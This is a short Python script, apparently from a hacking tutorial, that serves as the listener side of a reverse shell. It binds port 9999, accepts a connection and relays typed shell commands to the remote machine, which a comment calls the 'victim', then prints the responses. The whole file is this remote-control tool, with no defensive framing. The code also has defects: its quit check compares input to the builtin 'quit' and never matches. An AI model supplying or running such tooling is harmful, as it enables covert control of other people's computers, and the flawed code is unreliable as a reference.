# -*- coding: utf-8 -*-
"""
Created on Sat Aug 22 16:01:27 2020

@author: User
"""

import socket
import sys


# Create a socket( connect two computers )
def create_socket(): 
    try:
        global host
        global port
        global s
        
        host = " "
        port = 9999
        s = socket.socket()
    
    except socket.error as msg:
        print("Socket Creation  error: " + str(msg))
        
# Binding the socket and listening for connections
def bind_socket():
     try:
        global host
        global port
        global s
        
        print("Binding the Port" + str(port))
        
        s.bind((host, port))
        s.listen(5)
        
     except socket.error as msg:
         print("Socket binding error" + str(msg) + "\n" + "Retrying...")
         bind_socket() #Recursion
         
         
# Establish Connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()  
    print('Connection has been established' + " IP " + address[0] + " Port " + str(address[1]))
    send_commands(conn)
    conn.close()
    
#send commands to client/victim or a friend
def send_commands(conn):    
    while True:
        cmd = input()
        if cmd == quit:
            conn.close()
            s.close()
            sys.exit() #close black box
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8") #bytes to string, 1024 like chunk, type of encoding
            print(client_response, end=" ")
            
            
def main():
    create_socket()            
    bind_socket()
    socket_accept()
    
    
main()    




         
         
         